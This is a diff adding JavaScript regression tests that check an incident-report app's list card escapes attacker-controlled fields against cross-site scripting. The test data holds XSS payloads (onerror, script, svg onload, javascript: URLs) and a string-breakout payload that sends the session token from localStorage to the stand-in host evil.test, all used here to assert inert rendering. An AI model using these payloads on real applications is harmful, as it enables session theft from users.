@@ -14,9 +14,10 @@ import { loadApp, makeReporter } from './harness.mjs';
 
 const { T, byId } = loadApp(`
   mapSheetRows, buildIntakeMap, INTAKE_FIELDS, intakeValueHtml, toDisplayDateTime,
-  toDisplayDate, toISODate, renderIntake,
+  toDisplayDate, toISODate, renderIntake, renderIRList, escHtml, escJsAttr, safeUrl,
   get lastSheetAudit() { return lastSheetAudit; },
   get currentIR() { return currentIR; }, set currentIR(v) { currentIR = v; },
+  get allIRs() { return allIRs; }, set allIRs(v) { allIRs = v; },
 `, { capture: true });
 
 const { ok, head, finish } = makeReporter();
@@ -224,5 +225,95 @@ head('no ticket open');
 T.currentIR = null;
 T.renderIntake();
 ok('renders a note, not a throw', html().includes('No ticket selected'), html());
+
+// ── The list card, which is rendered from two untrusted sources ──────────────
+// The card is the WORST place in the app for this, because it renders for every
+// signed-in user the moment the app opens, from data two different untrusted
+// parties control:
+//
+//   • `droneId` is Form Responses column K — written by whoever submits the
+//     PUBLIC customer form. No account needed.
+//   • `status` and `priority` come from the `__IRS__` sentinel store, which skips
+//     every ACL check, so ANY signed-in user can set them on ANY ticket.
+//
+// A payload in either one used to execute in the admin's browser and could read
+// the session token straight out of localStorage. These assertions are on real
+// rendered output, not on the source, because "there is an escHtml somewhere on
+// that line" is not the property that matters — the property is that no markup
+// and no JS context escapes.
+head('the list card is rendered from attacker-controlled fields');
+const BREAKOUT = `x');fetch('https://evil.test/'+localStorage.ipb_session);//`;
+T.allIRs = [];
+T.renderIRList([{
+  irNumber: BREAKOUT,
+  droneId: 'S25 <img src=x onerror=alert(1)>',
+  priority: '"><script>alert(2)</script>',
+  status: `High' onmouseover='alert(3)`,
+  dateRaised: '<b>10 Aug</b>',
+  summaryLink: 'javascript:alert(4)',
+  assigneeName: '"><svg onload=alert(5)>',
+}]);
+const card = byId.get('ir-list').innerHTML;
+ok('no markup from any field reaches the DOM', !/<(img|script|svg|b|iframe)\b/i.test(card),
+  card.match(/<(img|script|svg|b|iframe)\b/gi));
+// Parsed per TAG, and tokenised as real attributes rather than scanned as text.
+// Two things a flat /onerror=/ scan gets wrong, both of which this card does
+// legitimately: the payload appears as inert TEXT (`&lt;img src=x onerror=…&gt;`),
+// and the card carries the app's OWN onclick. What matters is that the data
+// injected no attribute of its own — so collect the attribute names actually
+// present and diff them against the fixed set the renderer writes.
+const tags = card.match(/<[a-zA-Z][^>]*>/g) || [];
+ok('the card really rendered tags (so the checks below are not vacuous)', tags.length > 3, tags.length);
+const ATTR = /([a-zA-Z-]+)="[^"]*"/g;
+const attrNames = new Set();
+for (const t of tags) {
+  let m; ATTR.lastIndex = 0;
+  // Escaping is what makes this parse work: payload quotes are `&quot;` in HTML
+  // attributes and `\'` inside the handler, so none of them terminate a value.
+  while ((m = ATTR.exec(t))) attrNames.add(m[1].toLowerCase());
+}
+const ALLOWED_ATTRS = ['class', 'data-id', 'onclick', 'title', 'href', 'target', 'rel'];
+const injected = [...attrNames].filter(n => !ALLOWED_ATTRS.includes(n));
+ok('no attribute was injected by the data', injected.length === 0, injected);
+ok("the only handler attribute is the app's own goTicket()",
+  (card.match(/\son[a-z]+\s*="/gi) || []).length === 1, card.match(/\son[a-z]+\s*="/gi));
+ok('the serial is inert text', card.includes('&lt;img src=x onerror=alert(1)&gt;'), card.slice(0, 400));
+ok('the status is inert text', card.includes('&lt;script&gt;alert(2)&lt;/script&gt;'));
+
+// The onclick handler is a JS context, not an HTML one: escHtml() is NOT enough
+// there, because it leaves the single quote intact and the payload closes the
+// string literal. escJsAttr() escapes both the quote and the backslash.
+ok('the onclick argument cannot close its string literal',
+  !card.includes(`goTicket('${BREAKOUT}')`), card.match(/goTicket\([^)]*\)/));
+ok('the quote in the IR number is backslash-escaped inside the handler',
+  card.includes(`goTicket('x\\');fetch(`), card.match(/goTicket\('x[^)]{0,40}/));
+ok('the data-id attribute is quote-escaped, so it cannot add an attribute',
+  !/data-id="x'/.test(card), card.match(/data-id="[^"]*"/));
+
+// A link whose scheme is not http(s) must not become an anchor at all: an
+// escaped `javascript:` URL in href is still a live link.
+ok('a javascript: summary link produces no anchor', !card.includes('<a '), card.match(/<a [^>]*>/));
+ok('safeUrl rejects a javascript: scheme', T.safeUrl('javascript:alert(1)') === '');
+ok('safeUrl rejects a data: scheme', T.safeUrl('data:text/html,<script>') === '');
+ok('safeUrl keeps https', T.safeUrl('https://docs.google.com/document/d/abc') !== '');
+
+T.renderIRList([{ irNumber: 'IR409', droneId: 'S25P014', status: 'Open',
+  summaryLink: 'https://docs.google.com/document/d/abc' }]);
+const good = byId.get('ir-list').innerHTML;
+ok('a legitimate summary link still renders', good.includes('href="https://docs.google.com/document/d/abc"'),
+  good.match(/href="[^"]*"/));
+ok('a legitimate card renders its IR number and serial',
+  good.includes('IR409') && good.includes('S25P014'));
+
+head('escJsAttr escapes what escHtml must not');
+ok('a backslash is doubled, or it escapes the next character',
+  T.escJsAttr('a\\b') === 'a\\\\b', T.escJsAttr('a\\b'));
+ok('a single quote is backslash-escaped', T.escJsAttr("x'y") === "x\\'y", T.escJsAttr("x'y"));
+ok('a newline becomes \\n rather than breaking the literal',
+  T.escJsAttr('a\nb') === 'a\\nb', T.escJsAttr('a\nb'));
+ok('angle brackets are still HTML-escaped for the attribute context',
+  T.escJsAttr('<b>') === '&lt;b&gt;', T.escJsAttr('<b>'));
+ok('escHtml leaves the quote it was never asked to handle',
+  T.escHtml("x'y") === "x'y", T.escHtml("x'y"));
 
 finish();
